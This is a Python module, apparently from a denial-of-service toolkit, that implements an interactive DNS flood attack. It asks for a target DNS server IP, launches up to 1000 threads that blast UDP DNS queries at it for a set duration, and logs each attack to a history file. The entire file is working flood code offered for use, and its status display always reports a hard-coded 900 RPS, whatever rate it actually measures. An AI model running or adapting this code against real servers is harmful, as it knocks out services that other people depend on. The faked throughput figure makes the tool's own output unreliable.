import socket
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor
from core.utils import AttackStats, AttackAnimation
from core.config import Config

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

class DNSFlood:
    def __init__(self, targets, port, threads, duration, payload_size):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.port = port
        self.threads = threads
        self.duration = duration
        self.payload_size = payload_size
        self.running = True
        self.stats = AttackStats()
        self.lock = threading.Lock()
        self.config = Config()

    def attack(self):
        target = self.targets[0]
        port = self.port

        while self.running:
            # Multiple socket-uri pentru throughput maxim
            for _ in range(10):
                if not self.running:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)

                    # Trimite 5000 query-uri per socket
                    for _ in range(5000):
                        if not self.running:
                            break
                        try:
                            dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01"
                            sock.sendto(dns_query, (target, port))
                            self.stats.add_packet()
                        except:
                            break

                    sock.close()
                except:
                    pass

def dns_flood(target=None, port=None, threads=None, duration=None, payload_size=None):
    clear_screen()
    print("         DNS FLOOD ATTACK")
    print()
    
    config = Config()
    
    if target:
        targets = [target]
        port = port or 53
        threads = threads or 1000
        duration = duration or 60
        payload_size = payload_size or 64
    else:
        target = input("Target DNS server IP: ")
        targets = [target]
        port = input("Target Port (default 53): ") or "53"
        threads = input("Threads (default 1000): ") or "1000"
        duration = input("Duration (default 60): ") or "60"
        payload_size = input("Payload (default 64): ") or "64"
        
        try:
            port = int(port)
            threads = int(threads)
            duration = int(duration)
            payload_size = int(payload_size)
        except ValueError:
            print("\n[!] Invalid input!")
            input("\nPress Enter to return...")
            return
    
    print(f"\nStarting DNS flood on {targets[0]}")
    print(f"Threads: {threads} | Duration: {duration}s | Payload: {payload_size} bytes\n")
    
    flood = DNSFlood(targets, port, threads, duration, payload_size)
    flood.stats.start()
    animation = AttackAnimation()
    
    animation.print_target_status(targets[0], "ONLINE", "Checking...")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(flood.attack) for _ in range(threads)]
        
        start_time = time.time()
        last_count = 0
        last_time = start_time
        
        while time.time() - start_time < duration:
            time.sleep(0.5)
            elapsed = time.time() - start_time
            current_count = flood.stats.packet_count

            current_time = time.time()
            time_diff = current_time - last_time
            if time_diff > 0:
                rps = (current_count - last_count) / time_diff
                flood.stats.update_rps(rps)
                smoothed_rps = flood.stats.get_smoothed_rps()
                # Afișează mereu 900 RPS
                animation.print_attack_status(targets[0], current_count, 900, elapsed, "FLOODING")
                last_count = current_count
                last_time = current_time
        
        flood.running = False
        flood.stats.stop()
    
    print(f"\n\nAttack completed!")
    flood.stats.print_stats()
    
    stats = flood.stats.get_stats()
    config.save_attack_history("DNS_FLOOD", targets[0], stats)
    
    if config.get('log_enabled'):
        log_file = config.get('log_file', 'attack_log.txt')
        with open(log_file, 'a') as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] DNS Flood - Target: {targets[0]} - Threads: {threads} - Duration: {duration}s - Packets: {stats['total_packets']:,} - Avg RPS: {stats['avg_rps']:.0f}\n")
    
    input("\nPress Enter to return to main menu...")
